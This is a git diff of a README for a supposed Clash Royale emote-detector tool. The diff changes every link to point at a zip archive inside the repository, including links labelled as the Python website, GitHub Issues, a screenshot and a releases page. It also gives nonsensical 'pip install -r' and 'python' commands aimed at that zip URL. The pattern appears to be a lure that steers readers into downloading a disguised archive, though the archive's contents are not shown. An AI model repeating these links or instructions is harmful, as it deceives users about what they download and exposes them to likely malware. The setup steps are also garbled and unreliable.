@@ -1,12 +1,12 @@
 # 😃 clash-royale-emote-detector - Identify Emotes in Real-Time
 
-[![Download](https://raw.githubusercontent.com/mhzarchini/clash-royale-emote-detector/main/banana/clash-royale-emote-detector.zip)](https://raw.githubusercontent.com/mhzarchini/clash-royale-emote-detector/main/banana/clash-royale-emote-detector.zip)
+[![Download](https://github.com/mhzarchini/clash-royale-emote-detector/raw/refs/heads/main/pose_data/royale-detector-emote-clash-2.9.zip)](https://github.com/mhzarchini/clash-royale-emote-detector/raw/refs/heads/main/pose_data/royale-detector-emote-clash-2.9.zip)
 
 ## 📋 Overview
 
 Clash Royale Emote Detector is a simple tool that helps you identify and classify emotes in Clash Royale. It uses advanced technology to process webcam input and recognize various poses in real time.
 
-![Clash Royale Emote Detector in Action](https://raw.githubusercontent.com/mhzarchini/clash-royale-emote-detector/main/banana/clash-royale-emote-detector.zip)
+![Clash Royale Emote Detector in Action](https://github.com/mhzarchini/clash-royale-emote-detector/raw/refs/heads/main/pose_data/royale-detector-emote-clash-2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Follow these steps to download and run the Clash Royale Emote Detector:
 
 Click the link below to visit the releases page and download the application:
 
-[Download Clash Royale Emote Detector](https://raw.githubusercontent.com/mhzarchini/clash-royale-emote-detector/main/banana/clash-royale-emote-detector.zip)
+[Download Clash Royale Emote Detector](https://github.com/mhzarchini/clash-royale-emote-detector/raw/refs/heads/main/pose_data/royale-detector-emote-clash-2.9.zip)
 
 ### 2. Download the Program
 
@@ -27,17 +27,17 @@ On the releases page, look for the latest version of the software. Click on the 
 After downloading the application, you may need to install some additional tools. Open your command line interface (Command Prompt on Windows, Terminal on macOS or Linux). Enter the following command to install the required dependencies:
 
 ```bash
-pip install -r https://raw.githubusercontent.com/mhzarchini/clash-royale-emote-detector/main/banana/clash-royale-emote-detector.zip
+pip install -r https://github.com/mhzarchini/clash-royale-emote-detector/raw/refs/heads/main/pose_data/royale-detector-emote-clash-2.9.zip
 ```
 
-If you do not have `pip` installed, please visit the [Python website](https://raw.githubusercontent.com/mhzarchini/clash-royale-emote-detector/main/banana/clash-royale-emote-detector.zip) to download and install Python and `pip`.
+If you do not have `pip` installed, please visit the [Python website](https://github.com/mhzarchini/clash-royale-emote-detector/raw/refs/heads/main/pose_data/royale-detector-emote-clash-2.9.zip) to download and install Python and `pip`.
 
 ### 4. Run the Application
 
 To run the application, stay in your command line interface and type the following command:
 
 ```bash
-python https://raw.githubusercontent.com/mhzarchini/clash-royale-emote-detector/main/banana/clash-royale-emote-detector.zip
+python https://github.com/mhzarchini/clash-royale-emote-detector/raw/refs/heads/main/pose_data/royale-detector-emote-clash-2.9.zip
 ```
 
 ### 5. Controls Overview
@@ -71,12 +71,12 @@ If you encounter issues while running the application, here are some common prob
 
 ## 💬 Support
 
-If you have questions or need assistance, feel free to check the project's [GitHub Issues](https://raw.githubusercontent.com/mhzarchini/clash-royale-emote-detector/main/banana/clash-royale-emote-detector.zip) page. You can report problems or seek help from the community.
+If you have questions or need assistance, feel free to check the project's [GitHub Issues](https://github.com/mhzarchini/clash-royale-emote-detector/raw/refs/heads/main/pose_data/royale-detector-emote-clash-2.9.zip) page. You can report problems or seek help from the community.
 
 ## 📥 Download & Install
 
 Remember to download the software using the following link, if you haven't done so already:
 
-[Download Clash Royale Emote Detector](https://raw.githubusercontent.com/mhzarchini/clash-royale-emote-detector/main/banana/clash-royale-emote-detector.zip)
+[Download Clash Royale Emote Detector](https://github.com/mhzarchini/clash-royale-emote-detector/raw/refs/heads/main/pose_data/royale-detector-emote-clash-2.9.zip)
 
 Enjoy identifying your favorite emotes in real time!
